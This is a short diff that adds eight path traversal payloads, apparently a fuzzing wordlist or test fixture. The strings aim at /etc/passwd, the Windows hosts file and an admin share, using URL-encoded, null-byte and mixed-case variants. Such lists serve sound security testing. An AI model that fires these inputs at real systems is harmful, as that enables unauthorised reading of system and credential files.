@@ -1,0 +1,8 @@
+../../../../etc/passwd
+%2e%2e%2f%2e%2e%2fetc%2fpasswd
+.\..\Windows\System32\drivers\etc\hosts
+C:\Windows\System32\drivers\etc\hosts
+../../../etc/passwd%00.jpg
+..\..\WiNdOws\SyStEm32
+a/../../../../../etc/passwd
+\\localhost\c$\Windows\System32\drivers\etc\hosts
